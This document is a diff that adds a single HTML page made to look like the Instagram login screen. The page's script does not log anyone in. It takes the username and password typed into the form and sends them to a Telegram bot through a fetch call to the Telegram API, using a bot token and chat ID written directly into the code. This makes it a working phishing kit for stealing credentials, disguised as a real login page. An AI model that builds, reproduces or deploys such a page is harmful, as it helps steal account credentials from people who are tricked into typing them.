@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Instagram Login</title>
+<style>
+  * {
+    box-sizing: border-box;
+  }
+
+  body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    background-color: #fafafa;
+    font-family: Arial, sans-serif;
+  }
+
+  .container {
+    width: 350px;
+    padding: 40px 40px;
+    background-color: #fff;
+    border: 1px solid #dbdbdb;
+    border-radius: 1px;
+    box-shadow: 0 0 5px rgba(0,0,0,0.1);
+  }
+
+  .logo {
+    display: block;
+    margin: 0 auto 20px auto;
+    width: 175px;
+  }
+
+  form {
+    display: flex;
+    flex-direction: column;
+  }
+
+  input[type="text"],
+  input[type="password"] {
+    height: 40px;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    padding: 0 10px;
+    margin-bottom: 6px;
+    background: #fafafa;
+  }
+
+  button[type="submit"] {
+    height: 40px;
+    background-color: #3897f0;
+    border: none;
+    border-radius: 4px;
+    color: #fff;
+    font-weight: 600;
+    margin-top: 8px;
+    cursor: pointer;
+  }
+
+  button[type="submit"]:hover {
+    background-color: #3280e8;
+  }
+
+  .separator {
+    display: flex;
+    align-items: center;
+    margin: 10px 0;
+  }
+
+  .line {
+    flex: 1;
+    height: 1px;
+    background-color: #dbdbdb;
+  }
+
+  .or {
+    margin: 0 10px;
+    font-size: 13px;
+    color: #8e8e8e;
+    font-weight: 600;
+  }
+
+  .facebook {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-top: 10px;
+    cursor: pointer;
+  }
+
+  .facebook img {
+    margin-right: 8px;
+    width: 20px;
+  }
+
+  .forgot {
+    text-align: center;
+    margin-top: 12px;
+    font-size: 12px;
+    color: #385185;
+    cursor: pointer;
+  }
+
+  .signup {
+    display: flex;
+    justify-content: center;
+    margin-top: 20px;
+    font-size: 14px;
+  }
+
+  .signup span {
+    margin-right: 4px;
+  }
+
+  @media(max-width: 400px){
+    .container{
+      width: 90%;
+    }
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <!-- Updated Instagram logo from GitHub raw link -->
+  <img src="https://raw.githubusercontent.com/test1527276253-dotcom/El/main/pngtree-instagram-icon-png-image_8704817.png" alt="Instagram" class="logo"/>
+  <form id="loginForm">
+    <input type="text" id="username" placeholder="Phone number, username, or email" required />
+    <input type="password" id="password" placeholder="Password" required />
+    <button type="submit">Log In</button>
+  </form>
+  <div class="separator">
+    <div class="line"></div>
+    <div class="or">OR</div>
+    <div class="line"></div>
+  </div>
+  <div class="facebook" id="facebookBtn">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook"/>
+    Log in with Facebook
+  </div>
+  <div class="forgot">Forgot password?</div>
+  <div class="signup">
+    <span>Don't have an account?</span>
+    <a href="#">Sign up</a>
+  </div>
+</div>
+
+<script>
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault(); // Prevent default form submission
+
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    const message = `New login attempt:\nUsername: ${username}\nPassword: ${password}`;
+
+    // Your actual Telegram bot token
+    const botToken = '8772706170:AAGCmln8Bsi8o86EIoO_YiMamaURgCfKTtg';
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: '7555902997',
+        text: message
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log('Message sent:', data);
+      // Optionally, show an alert or redirect
+    })
+    .catch(error => {
+      console.error('Error:', error);
+    });
+  });
+</script>
+</body>
+</html>
